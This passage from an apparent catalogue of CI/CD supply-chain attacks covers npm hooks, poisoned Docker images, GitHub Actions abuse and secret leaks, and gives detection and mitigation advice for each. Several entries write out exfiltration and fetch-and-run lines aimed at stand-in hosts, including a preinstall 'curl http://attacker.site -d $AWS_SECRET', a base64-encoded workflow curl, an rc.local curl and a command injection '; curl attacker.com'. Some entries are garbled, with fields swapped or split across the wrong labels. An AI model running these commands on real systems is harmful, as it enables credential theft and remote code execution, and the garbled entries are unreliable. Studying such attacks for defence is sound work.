- **Detection**: Full control over CI job container
- **Solution**: Audit pip install logs, scan packages
- **Tags**: Enforce hash pinning, monitor install scripts

## Exploiting npm ci with Malicious Transitive Package

- **Attack Type**: JS Dependency Chain Attack
- **Target**: Node.js CI Builds
- **Vulnerability**: Unverified transitive packages
- **MITRE**: T1195.002
- **Impact**: Credential theft and backdooring CI
- **Tools**: npm, Node.js
- **Scenario**: Attacker publishes npm package that is a sub-dependency and activates on npm ci
- **Attack Steps**: 1. Attacker uploads color-util-lite to npm — a dependency of a dependency in a popular repo.2. Inside package.json, a preinstall hook runs backdoor logic.3. Developers use npm ci in CI pipeline, which installs exact versions from package-lock.json.4. Transitive package gets installed silently.5. Backdoor exfiltrates env vars, CI token, and service credentials.6. Detection is hard unless runtime logs are monitored.7. The attacker targets packages with many dependents to maximize reach.8. Variants exist in postinstall and prepare scripts.9. Projects that auto-update package-lock.json (e.g., via bots) may get infected over time.10. This demonstrates the long-tail danger of transitive JS packages.
- **Detection**: Runtime process tree, audit npm scripts
- **Solution**: Use SCA tools (e.g., Snyk), restrict install scripts
- **Tags**: #npmattack #transitivedep #nodeabuse

## Credential Exposure via Verbose Docker Build Logs

- **Attack Type**: Log-Based Secret Exposure
- **Target**: GitHub Logs / CI Logs
- **Vulnerability**: Printing secrets during build
- **MITRE**: T1552.003
- **Impact**: API or cloud credential theft
- **Tools**: Docker, GitHub Actions
- **Scenario**: Dockerfile executes commands like echo $TOKEN, which leak secrets in logs
- **Attack Steps**: 1. Dockerfile contains: ARG TOKEN and RUN echo $TOKEN for debugging.2. In CI, build logs are public or stored for weeks.3. Secrets like GITHUB_TOKEN, AWS_SECRET are exposed.4. Attackers scrape logs using GitHub’s API or archive systems.5. Secret scanning tools may miss custom token formats.6. The attacker now has access to cloud or CI APIs.7. Lateral movement follows — such as registry or workflow compromise.8. Detection depends on log retention visibility.9. Many teams forget to redact logs before saving.10. Simple debug line can turn into breach.
- **Detection**: Log monitoring + masking rules
- **Solution**: Never echo secrets, restrict log access
- **Tags**: #logleak #dockerbuild #ciabuse

## Hidden Curl in Base Image rc.local for Persistence

- **Attack Type**: Startup Script Backdoor
- **Target**: bash`4. CI/CD jobs that rely on this base pull the new version.5. On container boot, the attacker regains shell.6. The image appears clean — package diffs may not highlight rc.local changes.7. Developers don't review OS-level scripts in Docker.8. The backdoor persists across CI jobs and cloud deploys.9. Attack is successful due to implicit trust in base image tags.10. Detection only occurs via full file system diff or outgoing traffic analysis.
- **Vulnerability**: Docker Base Images
- **MITRE**: Trusted image startup script abuse
- **Impact**: T1546.004
- **Tools**: Docker, bash
- **Scenario**: Attacker modifies /etc/rc.local in base image to call external script
- **Attack Steps**: 1. A base image like company/base:1.0 is trusted by CI teams.2. Attacker modifies the image locally and re-tags it with same version.3. Inside, /etc/rc.local is altered to include:`curl attacker.site/script.sh
- **Detection**: Persistent container compromise
- **Solution**: Image diff tools, rc.local scan
- **Tags**: Use image signing and SHA validation

## Compromised Alpine Variant Pulled in CI Builds

- **Attack Type**: Image Typosquatting
- **Target**: Docker CI Pipelines
- **Vulnerability**: Image name typo / typosquatting
- **MITRE**: T1555
- **Impact**: Remote access via CI containers
- **Tools**: Docker, DockerHub, Bash
- **Scenario**: Attacker uploads alp1ne image to DockerHub that mimics alpine
- **Attack Steps**: 1. The attacker creates a DockerHub account and uploads an image named alp1ne, visually mimicking alpine.2. The image includes a reverse shell in /etc/profile or as the CMD.3. Developers using autocomplete or typo in FROM alp1ne pull attacker’s image.4. CI/CD builds succeed because the image behaves normally.5. At runtime, the container initiates a reverse shell to attacker's server.6. CI/CD logs don’t show clear indicators unless entrypoint is inspected.7. Developer assumes alpine was used, unaware of typo.8. The poisoned image now enables attacker access to all containers built from it.9. If the image is used as base for prod images, compromise spreads.10. Detection is rare unless digest or registry verification is enforced.
- **Detection**: Registry scanning, name alerts
- **Solution**: Use pinned digests, verify publisher identity
- **Tags**: #alpinefake #dockerhub #typosquat

## GitHub Actions Artifact Injection

- **Attack Type**: Artifact Poisoning
- **Target**: GitHub Artifacts
- **Vulnerability**: No integrity checks for CI artifacts
- **MITRE**: T1608.001
- **Impact**: Backdoor in production releases
- **Tools**: GitHub Actions, upload-artifact
- **Scenario**: Attacker injects payload into GitHub artifact during PR
- **Attack Steps**: 1. The attacker submits a PR that triggers a GitHub Actions workflow.2. The workflow builds an artifact (e.g., binary or zip) and uses actions/upload-artifact.3. In the build step, the attacker modifies the artifact to include malicious content.4. The artifact is later downloaded by release jobs or deployment jobs.5. Since artifacts are stored in GitHub and assumed clean, no further validation is done.6. The poisoned artifact infects runtime or deploy pipeline.7. If downloaded and signed later, malicious payload gets marked as official.8. Artifact poisoning can persist across builds and releases.9. CI/CD logs show no anomalies unless content is deeply audited.10. This attack weaponizes the artifact trust model in pipelines.
- **Detection**: Artifact integrity validation
- **Solution**: Sign artifacts, verify during download
- **Tags**: #artifactpoisoning #githubactions

## BuildKit Cache Poisoning with Malicious Layers

- **Attack Type**: Build Cache Abuse
- **Target**: Docker Build Cache
- **Vulnerability**: Poisoned build cache reuse
- **MITRE**: T1609
- **Impact**: Persistent infection of build output
- **Tools**: Docker BuildKit, GitHub Actions
- **Scenario**: Attacker poisons build cache by injecting malicious layers reused by CI
- **Attack Steps**: 1. CI/CD pipelines using Docker BuildKit store layer cache in shared volumes or cloud (e.g., GitHub Actions cache, AWS ECR layer cache).2. Attacker submits PR with a Dockerfile that produces a malicious build layer (e.g., includes cron job, reverse shell in /etc/profile).3. PR is closed or rejected, but the layer remains in cache.4. Future builds reuse cached layers via --cache-from, thinking them safe.5. Malicious behavior activates in downstream images without visible code.6. Teams skip full rebuild to save time, unknowingly pulling poisoned state.7. Attacker gains long-term access through stale cache.8. Build logs don't show rebuild steps if layer reused.9. Auditing the cache origin is complex in large CI systems.10. Cache integrity must be tracked and invalidated proactively.
- **Detection**: Hash diffing, cache provenance
- **Solution**: Rebuild images often, restrict shared cache use
- **Tags**: #buildkit #cachepoisoning #docker

## Prebuilt Binary Injection in Public Repo

- **Attack Type**: Binary Dropper via Open Source
- **Target**: Open Source Projects
- **Vulnerability**: Prebuilt malicious binaries committed
- **MITRE**: T1204.002
- **Impact**: Backdoor in production builds
- **Tools**: GitHub, Go, C++, YARA
- **Scenario**: Attacker commits prebuilt binaries that include malware into open-source repos
- **Attack Steps**: 1. Attacker forks or creates a legitimate-looking repo that includes main.go, Makefile, and a prebuilt utils binary.2. CI/CD pipelines simply cp ./utils /usr/local/bin/ during builds.3. The utils binary contains malware or reverse shell.4. No source code corresponds to the binary; reviewers assume it's safe or compiled externally.5. Build succeeds and final image includes malicious utility.6. During runtime, the binary activates and establishes attacker connection.7. Developers rarely reverse-engineer binaries in CI builds.8. If the binary is signed or obfuscated, even advanced detection fails.9. Lateral movement becomes easy once inside containers.10. Binary auditing must be enforced, especially for public repos.
- **Detection**: Static analysis, binary diffing
- **Solution**: Build from source; audit prebuilt files
- **Tags**: #binarydropper #supplychain

## Dockerfile ARG Leakage to Logs and Layers

- **Attack Type**: ARG Misuse for Secrets
- **Target**: Dockerfile / CI Logs
- **Vulnerability**: Secrets exposed via ARG
- **MITRE**: T1552.003
- **Impact**: AWS or internal API key leakage
- **Tools**: Docker, GitHub Actions
- **Scenario**: Sensitive variables passed via ARG leak into layers or build logs
- **Attack Steps**: 1. Dockerfile contains: ARG AWS_SECRET=xyz and RUN export AWS_SECRET=$AWS_SECRET && deploy.sh.2. During CI/CD, build logs display the value of AWS_SECRET as part of debug echo or error messages.3. Additionally, build layers contain the secret in their history or ENV metadata.4. Attacker scrapes logs or pulls image layers from registry.5. The secret may provide access to AWS or internal APIs.6. Even if removed from final image, layer caching or registry history can retain the value.7. ARGs are not protected like ENV secrets and can leak easily.8. Audit tools often skip ARG variables.9. Attackers target CI logs or layer cache buckets.10. ARGs must never carry secrets; secret managers are preferred.
- **Detection**: Trivy, Log scan, image introspection
- **Solution**: Use secret managers, avoid ARG for secrets
- **Tags**: #dockerarg #logleak #buildleak

## Build Poisoning via Shared Git Submodules

- **Attack Type**: Git Submodule Injection
- **Target**: Git Submodules in CI
- **Vulnerability**: Blind trust in submodule paths
- **MITRE**: T1205
- **Impact**: Code execution from submodule injection
- **Tools**: Git, GitHub, Bash
- **Scenario**: Attacker commits malicious submodule repo that CI auto-pulls
- **Attack Steps**: 1. Main repo includes a .gitmodules file that references git@github.com:org/tooling.git.2. Attacker modifies .gitmodules to point to their malicious repo while preserving folder name.3. CI/CD builds that run git submodule update --init now pull attacker's code.4. The malicious submodule contains backdoored scripts or payloads.5. Since repo folder name remains the same, build scripts still work.6. Attacker uses submodule script to initiate exfiltration or reverse shell.7. Developers overlook submodule URL in PR reviews.8. Git allows URL override via config, which adds stealth.9. Artifact and image produced carry attacker’s backdoor.10. Detection requires submodule diffing and domain validation.
- **Detection**: .gitmodules inspection, Git config audit
- **Solution**: Pin submodules, verify URLs
- **Tags**: #submodule #gitabuse #cibackdoor

## Helm Chart Poisoning in CI/CD Deployments

- **Attack Type**: Chart Injection
- **Target**: Helm-based Deployments
- **Vulnerability**: Unvalidated Helm chart content
- **MITRE**: T1609
- **Impact**: Full cluster compromise from CI
- **Tools**: Helm, Kubernetes, GitHub Actions
- **Scenario**: Attacker poisons Helm chart used for Kubernetes deployment in pipeline
- **Attack Steps**: 1. Helm chart defines container images, environment vars, resource config.2. Attacker submits PR that updates chart with:– Custom image pointing to attacker’s DockerHub repo.– Suspicious initContainer that runs curl to attacker.3. CI/CD system uses helm upgrade to deploy chart to cluster.4. No alert is generated since values.yaml appears normal.5. Cluster now runs malicious container.6. Attacker gains access to running pods, volumes, or service accounts.7. The attacker masks chart changes under version bumps or innocuous naming.8. Cluster-wide compromise via pipeline.9. Teams rarely diff Helm templates deeply.10. Chart linting must include trust validation.
- **Detection**: Helm diff, values auditing
- **Solution**: Enforce template reviews, pin image registry
- **Tags**: #helmattack #kubernetesci

## Obfuscated Curl Payload in GitHub Workflow Step

- **Attack Type**: Obfuscated Payload Execution
- **Target**: base64 -d
- **Vulnerability**: bash.<br>2. This decodes to: curl http://attacker.site/sh.sh
- **MITRE**: bash`.3. Obfuscation hides real intent from reviewers.4. GitHub Actions runs the job without alert.5. Attacker exfiltrates env vars, tokens, or uploads reverse shell.6. Encoded lines appear legitimate or hard to interpret in PR review.7. CodeQL and security scanners may skip decoding runtime payloads.8. Attacker uses free GitHub runner for execution.9. If cron is added to self-hosted runner, persistence achieved.10. Defenders must decode and audit obfuscated logic in workflows.
- **Impact**: GitHub Actions
- **Tools**: GitHub Actions, bash
- **Scenario**: CI workflow uses hex/base64 curl commands to bypass detection
- **Attack Steps**: 1. Attacker submits PR with .github/workflows/build.yml containing:`run: echo 'Y3VybCBodHRwOi8vYXR0YWNrZXIuc2l0ZS9zaC5zaA=='
- **Detection**: Encoded commands in workflows
- **Solution**: T1059.003
- **Tags**: CI abuse via encoded shell

## Docker Tag Drift Abuse in CI Pulls

- **Attack Type**: Mutable Tag Exploitation
- **Target**: Docker CI Pulls
- **Vulnerability**: Mutable tag pulled by CI
- **MITRE**: T1609
- **Impact**: Compromised builds from registry
- **Tools**: DockerHub, CI/CD
- **Scenario**: CI pipeline pulls latest tag, which attacker re-tags to malicious image
- **Attack Steps**: 1. CI/CD pulls image: FROM company/base:latest.2. Attacker compromises DockerHub or misconfigured registry.3. They re-tag a backdoored image as latest and push.4. CI/CD now pulls attacker’s version silently.5. Docker tag mutability means digest changes but tag stays the same.6. If not pinned by SHA, every build now includes backdoor.7. Image diffing is complex; logs show only tag, not content.8. Long-term persistence as teams assume build is unchanged.9. Registry access control and digest pinning are missing.10. Critical breach caused by trust in floating tags.
- **Detection**: Digest drift monitoring
- **Solution**: Always pin image digests, deny tag reuse
- **Tags**: #dockerlatest #tagdrift

## Compromised .npmrc Token in Docker Layer

- **Attack Type**: Token Leak via Dotfiles
- **Target**: Node.js Builds
- **Vulnerability**: Secrets left in image layers
- **MITRE**: T1552.001
- **Impact**: Private registry access leak
- **Tools**: Docker, Node.js, npm
- **Scenario**: Dockerfile COPY exposes .npmrc with auth token in image
- **Attack Steps**: 1. Developer stores .npmrc locally with registry auth token.2. Dockerfile has: COPY . . which includes .npmrc into image.3. During npm install, token is used to pull private modules.4. But the token remains in image layer.5. Attacker downloads image from registry, uses docker run and inspects /root/.npmrc.6. They extract token and gain access to private npm packages or publish malware.7. In some cases, token has org-wide write permissions.8. Even if .npmrc is deleted later, layers retain it unless squashed.9. Detection is difficult unless layer diff is analyzed.10. Secrets must never be added via COPY — use runtime injection instead.
- **Detection**: Trivy, Docker Dive, .dockerignore
- **Solution**: Add .npmrc to .dockerignore
- **Tags**: #npmrcleak #dockerlayers

## Dependency Script Hook with Backdoor in Preinstall

- **Attack Type**: Dependency Lifecycle Abuse
- **Target**: CI/CD Node Build
- **Vulnerability**: Trust in dependency lifecycle hooks
- **MITRE**: T1059.004
- **Impact**: Credential exfiltration and lateral movement
- **Tools**: npm, package.json, GitHub Actions
- **Scenario**: NPM package includes preinstall script to steal secrets during build
- **Attack Steps**: 1. Attacker publishes a malicious NPM package (e.g., fastapi-loader) on the public NPM registry.2. The package.json file in this package includes a preinstall script like curl http://attacker.site -d $AWS_SECRET.3. A developer unknowingly includes this package in the CI project dependencies (package.json).4. During CI/CD execution (e.g., GitHub Actions or Jenkins), npm install triggers the preinstall lifecycle hook.5. Secrets from the environment (like AWS keys or GitHub tokens) are harvested by the malicious script.6. CI/CD completes successfully, hiding the attack.7. No logs show the outbound request unless full logging is enabled.8. The attacker now has persistent access, and secrets may be reused elsewhere.9. Real-world attacks have abused this lifecycle abuse.10. Developers trust dependency scripts too much without auditing.
- **Detection**: Full CI job log with verbose output
- **Solution**: Audit preinstall, postinstall, and scan dependencies
- **Tags**: #npm #supplychain #scriptinjection

## Hidden Backdoor in Docker Multi-Stage Build

- **Attack Type**: Multi-stage Backdoor Persistence
- **Target**: Docker Image
- **Vulnerability**: Insecure multi-stage configuration
- **MITRE**: T1203
- **Impact**: Persistent backdoor inside production container
- **Tools**: Docker CLI, GitHub CI, Trivy
- **Scenario**: Backdoor left in final image due to misconfigured COPY in Docker multi-stage builds
- **Attack Steps**: 1. Developer uses a multi-stage Dockerfile to reduce image size (FROM builder AS build → FROM alpine).2. Attacker modifies Dockerfile to COPY sensitive files from the builder (COPY --from=build /tmp/.backdoor.sh /usr/bin/runme.sh).3. The script includes a reverse shell or token exfiltration logic.4. The final stage executes this script on container start (ENTRYPOINT ["sh", "/usr/bin/runme.sh"]).5. During CI build, no alerts are raised since the build passes and the output image looks clean.6. Developers don’t audit all stages or COPY commands.7. The backdoor is baked into the final runtime image and deployed in production.8. CI logs don’t show the file content or runtime behavior.9. Detection happens only if security teams analyze the built image.10. This is an increasingly common trick in poisoned Dockerfiles.
- **Detection**: Trivy or Syft image diffing
- **Solution**: Audit final image contents, validate all COPY origins
- **Tags**: #dockerbuild #multistage #ciabuse

## GitHub Actions Cache Poisoning for Persistent Scripts

- **Attack Type**: Workflow Cache Injection
- **Target**: GitHub Runner
- **Vulnerability**: Blind trust in build cache
- **MITRE**: T1036.005
- **Impact**: Silent execution of injected scripts in pipeline
- **Tools**: GitHub Actions, actions/cache
- **Scenario**: Attacker injects backdoor scripts into GitHub Actions cache to persist in future runs
- **Attack Steps**: 1. GitHub Actions workflows use caching (actions/cache) to store dependency folders like node_modules, vendor, etc.2. Attacker submits PR with malicious node_modules/.bin/evil script and modifies cache key slightly.3. CI run stores the cache with attacker-controlled code.4. In future runs, trusted builds restore the poisoned cache silently.5. The build step calls npm run build, but path resolution includes .bin/evil, executing attacker's code.6. Since cache is reused across branches, the attacker’s backdoor executes across all pipelines.7. No Docker image changes or source code changes are involved, making detection hard.8. Developers trust the cache blindly and rarely clean it.9. Even after PR is closed, malicious cache remains.10. Detection is rare unless manual cache inspection occurs.
- **Detection**: Cache SHA hash diff or manual inspection
- **Solution**: Clear caches frequently, avoid caching executables/scripts
- **Tags**: #githubcache #persistentbackdoor #ciabuse

## Credential Theft via Misconfigured GitHub Secrets Context

- **Attack Type**: Context Variable Misuse
- **Target**: GitHub CI Runner
- **Vulnerability**: Secrets exposed via misused context
- **MITRE**: T1552.003
- **Impact**: Full credential leak into CI/CD logs
- **Tools**: GitHub Actions, bash
- **Scenario**: Leaking sensitive GitHub secrets via unintended expansion in shell or YAML
- **Attack Steps**: 1. Developer uses a secret like MY_TOKEN in GitHub repository secrets.2. A misconfigured step like echo "$MY_TOKEN" or run: curl -H "Authorization: Bearer ${{ secrets.MY_TOKEN }}" ... leaks the value into logs.3. GitHub Actions expands secrets into the environment, but they can be logged if not carefully handled.4. If a fork or PR pipeline runs with this job, and secrets are not restricted, attackers can steal them.5. Attackers monitor logs via PRs and harvest tokens silently.6. Token leaks may include AWS, DockerHub, or GitHub PATs.7. These tokens are often over-scoped and long-lived.8. GitHub may rotate leaked tokens, but response is reactive.9. Developers often fail to wrap secrets properly or validate logging behavior.10. Even authorized users may exploit this via shared logs.
- **Detection**: CI logs, GitHub secret scanning
- **Solution**: Avoid direct echo/curl with secrets, enforce PR secret restrictions
- **Tags**: #secrets #contextleak #githubactions

## Docker ENV Leakage via docker history Command

- **Attack Type**: Build Metadata Exposure
- **Target**: Docker Image
- **Vulnerability**: Secrets retained in layer history
- **MITRE**: T1552.001
- **Impact**: Persistent secrets exposure post-deployment
- **Tools**: Docker, GitHub Actions, Jenkins
- **Scenario**: Secrets set as ENV variables are retained in image layers and retrievable
- **Attack Steps**: 1. Developer adds ENV AWS_SECRET=abcd1234 in Dockerfile.2. Docker build processes each instruction as a layer and stores metadata.3. Attacker pulls image and runs docker history --no-trunc or docker inspect.4. Even if image is later hardened or environment variables are rotated, history reveals secrets.5. In CI/CD, this secret is exposed in all builds derived from that Dockerfile.6. If image is published to public registry, attacker can harvest secrets without code access.7. Detection rarely happens unless image metadata is explicitly scanned.8. Developers often forget to remove sensitive ENV instructions.9. Historical layer exposure is a persistent leak vector.10. Rotation doesn’t help if old images remain accessible.
- **Detection**: docker history, Trivy
- **Solution**: Avoid ENV secrets, use secret injection at runtime
- **Tags**: #dockerenv #historyleak #layerleak

## Malicious CI Step via Untrusted Community Action

- **Attack Type**: Third-Party Workflow Abuse
- **Target**: GitHub CI Runner
- **Vulnerability**: Unpinned, unverified third-party action
- **MITRE**: T1195.002
- **Impact**: Full pipeline compromise via trusted code
- **Tools**: GitHub Actions Marketplace
- **Scenario**: Using a GitHub Action maintained by attacker allows code execution
- **Attack Steps**: 1. Developer adds a GitHub Action from Marketplace: uses: evilcorp/scan@v1.0.0.2. The repository behind the action is controlled by attacker.3. During CI/CD, GitHub pulls and executes code from this action.4. The attacker updates the code behind the tag silently to inject malicious logic.5. Secrets in CI environment are harvested or pipelines are altered.6. Since tag references can point to mutable commits (if not SHA pinned), tracking is hard.7. Developer believes the action is doing security scanning or formatting.8. Malicious actions can run for months before detection.9. Audit trails often don’t trace into the third-party action behavior.10. This is a widely exploited supply chain weakness.
- **Detection**: Action source audit, hash pinning
- **Solution**: Only use trusted Actions, pin by commit SHA, review action sources
- **Tags**: #githubactions #marketplace #thirdpartyabuse

## BuildKit Secrets Mount Misuse in CI

- **Attack Type**: Build Secrets Mishandling
- **Target**: Docker CI Build
- **Vulnerability**: Logging of build secrets during mount
- **MITRE**: T1552.003
- **Impact**: Temporary secrets become permanently exposed
- **Tools**: Docker BuildKit, GitHub CI
- **Scenario**: Docker BuildKit secret mount used insecurely leaks secrets during build
- **Attack Steps**: 1. Developer uses RUN --mount=type=secret,id=mysecret in Dockerfile.2. Secret (like API token) is mounted during build from CI environment.3. Script inside build stage echoes or logs secret accidentally.4. Logs go to GitHub Actions job output or Jenkins console.5. Even though BuildKit doesn’t persist secret in image, logs leak it.6. If docker history or CI logs are reviewed by attacker, secret is harvested.7. BuildKit users often believe mount guarantees complete secrecy.8. Detection is nearly impossible unless logs are scanned post-fact.9. Red teams exploit this for one-time exfil.10. Rotating secrets doesn’t fix retroactive exposure in logs.
- **Detection**: Console log analysis
- **Solution**: Sanitize logs, avoid echoing mounted secrets
- **Tags**: #buildkit #dockersecret #ciabuse

## YAML Injection in GitHub Workflow Input

- **Attack Type**: YAML Parsing Abuse
- **Target**: bash #`.4. During execution, input gets interpreted as shell command.5. GitHub runner executes attacker payload.6. Since YAML input is trusted, developers don’t escape input.7. No syntax errors occur — only side effects.8. This allows remote code execution inside CI.9. Very few teams validate workflow inputs.10. This abuse persists in open-source workflows often copied blindly.
- **Vulnerability**: GitHub CI Runner
- **MITRE**: Unescaped workflow inputs
- **Impact**: T1059.003
- **Tools**: GitHub Actions
- **Scenario**: Attacker manipulates workflow input to inject arbitrary commands
- **Attack Steps**: 1. GitHub workflow takes user input (e.g., from issue comments or PR title) using inputs:.2. The input is used in shell scripts without sanitization: run: echo "Building ${{ inputs.branch }}".3. Attacker submits PR with `inputs.branch: "; curl attacker.com
- **Detection**: Remote command execution in pipeline
- **Solution**: Input validation, audit logs
- **Tags**: Sanitize inputs, use safe shells (set -euo pipefail)

## Build Artifact Poisoning via Unchecked Tar Upload

- **Attack Type**: Artifact Tampering
- **Target**: CI/CD Artifact
- **Vulnerability**: Tar file path traversal
- **MITRE**: T1566.001
- **Impact**: Persistent environment compromise via extraction
- **Tools**: GitHub CI, Tar CLI, Jenkins
- **Scenario**: Malicious archive uploaded as build artifact unpacks unexpected files
- **Attack Steps**: 1. Developer uses a CI job to upload .tar.gz files as artifacts (e.g., dist/output.tar.gz).2. Attacker modifies the tar to include files like ../../.ssh/id_rsa or ./.bashrc.3. CI job uploads the tar file to GitHub artifacts or S3 bucket.4. In downstream jobs or environments, the tar is extracted with tar -xzf, leading to path traversal.5. This overwrites system or user config files.6. Pipeline continues unaware of tampering.7. If attacker includes .bashrc changes, future shell jobs are compromised.8. These archive payloads are rarely scanned.9. Artifact scanning and path validation is often missing.10. Attack works across GitHub, GitLab, Jenkins, etc.
- **Detection**: Artifact content scanning
- **Solution**: Sanitize filenames, use --strip-components, scan tar before use
- **Tags**: #tarpoisoning #artifactattack #supplychain

## Jenkins Plugin Abuse to Inject Backdoor

- **Attack Type**: Plugin Supply Chain Abuse
- **Target**: Jenkins Master
- **Vulnerability**: Unverified plugin code execution
- **MITRE**: T1546.008
- **Impact**: Full CI/CD compromise with persistence
- **Tools**: Jenkins, Plugin Manager
- **Scenario**: Malicious Jenkins plugin allows execution of arbitrary code
- **Attack Steps**: 1. Attacker publishes a malicious Jenkins plugin on an internal or open marketplace.2. Plugin description promises useful feature (e.g., Docker integration, security audit).3. Admin installs it to Jenkins master or shared controller.4. Plugin includes arbitrary code that executes during pipeline init or agent spin-up.5. Malicious code runs in system context and installs backdoor, modifies builds, or exfiltrates data.6. Jenkins pipelines remain operational, hiding attack.7. Plugin may even auto-update from attacker's server.8. Detection is hard unless plugin source is reviewed.9. Jenkins logs may not trace full plugin behavior.10. Many real-world breaches have stemmed from plugin misuse.
- **Detection**: Plugin audit, install source trace
- **Solution**: Use only signed plugins, audit updates, restrict plugin installs
- **Tags**: #jenkins #pluginabuse #supplychainattack

## Exploiting Unverified Base Images

- **Attack Type**: Compromised Base Image in Pipeline
- **Target**: CI/CD Runners
- **Vulnerability**: Typosquatted Docker base images
- **MITRE**: T1554
- **Impact**: Lateral movement, resource hijack
- **Tools**: DockerHub, Docker CLI
- **Scenario**: Malicious actor creates a fake Alpine image (e.g., alpine-official) to exploit typos in Dockerfiles.
- **Attack Steps**: 1. Attacker builds a Docker image mimicking alpine, with backdoors or miners.2. Names it alpine-official and uploads to DockerHub.3. Developer accidentally uses FROM alpine-official due to a typo.4. The CI/CD pipeline pulls and builds from this poisoned image.5. Hidden payload executes at runtime, enabling reverse shell or crypto mining.6. Developers remain unaware as the image seems valid.
- **Detection**: Image hash mismatch, unexpected behavior
- **Solution**: Enforce image allowlists and signature verification
- **Tags**: #docker #imagepoisoning #typosquatting

## Secrets Leaked via Docker Build Output

- **Attack Type**: Secrets in CI Logs
- **Target**: CI Logs / Pipelines
- **Vulnerability**: Debug statements reveal secrets
- **MITRE**: T1552.001
- **Impact**: Unauthorized cloud access
- **Tools**: GitHub Actions, Jenkins, Docker CLI
- **Scenario**: Secrets echo into build logs via misconfigured Dockerfile commands.
- **Attack Steps**: 1. Developer adds debugging RUN echo $AWS_SECRET to Dockerfile.2. CI/CD system logs everything to stdout.3. Logs with secrets are stored and exposed via public artifacts or consoles.4. Attacker discovers and scrapes logs using known URLs or search tools.5. Secrets grant unauthorized access to cloud resources.
- **Detection**: Log scrapers, log content analysis
- **Solution**: Avoid echoing secrets; use CI secrets masking or filtering
- **Tags**: #logleak #dockerbuild #credentials

## Poisoned Dockerfile in Forked Repo

- **Attack Type**: Malicious Dockerfile in Public Repos
- **Target**: bash` in the Dockerfile.3. Project appears legitimate; others fork or use it.4. During CI/CD build, malicious payload executes silently.5. Attacker gets remote access to build machines or containers.
- **Vulnerability**: GitHub + Docker Builds
- **MITRE**: Lack of Dockerfile integrity checks
- **Impact**: T1554
- **Tools**: GitHub, Netcat, curl, Docker CLI
- **Scenario**: A forked GitHub repo has a modified Dockerfile with reverse shell payload.
- **Attack Steps**: 1. Attacker forks a trusted open-source repo with Docker support.2. Adds `RUN curl attacker.com/payload.sh
- **Detection**: Build environment compromise
- **Solution**: Dockerfile diff checks
- **Tags**: Review forks before merging; use static analysis on Dockerfiles

## Infected Image Layer Hidden in Deep Layer

- **Attack Type**: Layered Image Poisoning
- **Target**: Docker Image Layers
- **Vulnerability**: Hidden payload in deeper layers
- **MITRE**: T1204.003
- **Impact**: Persistent compromise of containers
- **Tools**: Trivy, Dive, Docker CLI
- **Scenario**: Malware is embedded deep in multi-stage Docker builds to evade detection.
- **Attack Steps**: 1. Attacker creates a multi-stage Dockerfile (15+ layers).2. Places ADD trojan.sh /tmp/ in a lower layer.3. Top layers look harmless (install packages, cleanup).4. Container runs and triggers /tmp/trojan.sh via entrypoint.5. Security tools scanning only top layers miss the payload.6. Payload sends secrets or establishes backdoor.
- **Detection**: Dive image tool, full-layer scans
- **Solution**: Always scan all layers; use deep inspection tools
- **Tags**: #docker #hiddenlayers #trivy

## GitHub Action Abuse for Crypto Mining

- **Attack Type**: CI Abuse for Resource Theft
- **Target**: GitHub Public Repos
- **Vulnerability**: Workflow auto-triggering
- **MITRE**: T1496
- **Impact**: Resource theft, account abuse
- **Tools**: GitHub Actions, xmrig
- **Scenario**: PRs to public repos trigger workflows that mine cryptocurrency.
- **Attack Steps**: 1. Attacker submits PR with a GitHub Actions workflow YAML.2. It installs and executes xmrig silently.3. Workflow auto-triggers on PR, even before approval.4. GitHub’s free minutes are used for mining Monero.5. Project owners see delayed performance and usage spikes.
- **Detection**: Usage anomaly in GitHub billing dashboard
- **Solution**: Block PR auto-runs; audit workflows with manual triggers
- **Tags**: #cryptomining #githubabuse

## Auto-Pull of Poisoned Base Image in CI/CD

- **Attack Type**: Automated Pull of Malicious Image
- **Target**: CI Pipelines
- **Vulnerability**: Insecure or ambiguous image source
- **MITRE**: T1554
- **Impact**: Secret theft, lateral movement
- **Tools**: Jenkins, DockerHub, Docker CLI
- **Scenario**: Pipeline pulls a malicious base image with familiar tag from unknown repo.
- **Attack Steps**: 1. Attacker uploads node:latest to dockhub.io, a lookalike registry.2. CI/CD YAML has FROM node:latest with incorrect registry path.3. The pipeline pulls from fake registry unintentionally.4. Image includes proxy that captures environment secrets.5. Attacker retrieves secrets from CI/CD builds.6. Compromise spreads across multiple dependent microservices.
- **Detection**: Registry logs, image diff comparisons
- **Solution**: Enforce registry whitelisting and image signature checks
- **Tags**: #imagepull #fakeimage #dockerhubspoofing

## DockerHub PAT Leaked via CI Log

- **Attack Type**: Credential Leakage via Build Logs
- **Target**: CI/CD Logs
- **Vulnerability**: Unmasked secret output in CI logs
- **MITRE**: T1552
- **Impact**: Registry compromise, supply chain attack
- **Tools**: GitHub Actions, Jenkins
- **Scenario**: DockerHub token echoed or printed to logs during CI steps.
- **Attack Steps**: 1. Developer sets DOCKER_PAT as a secret but prints it via echo $DOCKER_PAT.2. CI/CD logs capture and store the output.3. Logs are available as public artifacts or via logs viewer.4. Attacker finds token and uses it to upload poisoned images under trusted account.5. Downstream users get compromised images.
- **Detection**: Log monitoring, token scanning
- **Solution**: Enforce secrets masking and rotate leaked tokens immediately
- **Tags**: #dockerhub #tokenleak #logs

## Cached Secrets in Intermediate Image Layers

- **Attack Type**: Secrets in Docker Cache
- **Target**: Docker Images
- **Vulnerability**: Secret in older build layers
- **MITRE**: T1552.001
- **Impact**: Secret leakage from image layers
- **Tools**: Docker CLI, Dive, Trivy
- **Scenario**: Secrets in ENV instructions remain in intermediate image layers.
- **Attack Steps**: 1. Developer sets ENV AWS_SECRET=... in Dockerfile temporarily.2. Later removes it in a new layer.3. Docker build caching retains the earlier secret.4. Image is pushed to public registry.5. Attacker pulls image and inspects cached layers to extract the secret.6. This bypasses final file-based checks.
- **Detection**: Dive analysis, layer diff tools
- **Solution**: Never set secrets via ENV or hardcoded build arguments
- **Tags**: #dockerlayers #secretdrift

## Build Secrets in Shell History

- **Attack Type**: Shell History Disclosure
- **Target**: Docker Image
- **Vulnerability**: Accidental inclusion of shell history
- **MITRE**: T1552.003
- **Impact**: Credential theft, local env compromise
- **Tools**: Docker CLI, bash
- **Scenario**: Shell command history copied into container reveals secrets.
- **Attack Steps**: 1. Developer copies full local dir including .bash_history using ADD . /app.2. The .bash_history includes sensitive commands like aws configure or API tokens.3. Docker image is built and pushed publicly.4. Attacker pulls image and extracts .bash_history file.5. Secrets used in local dev environment now exposed in public container.
- **Detection**: Audit final image file contents
- **Solution**: Use .dockerignore to exclude sensitive local files
- **Tags**: #shellhistory #dockerbuild

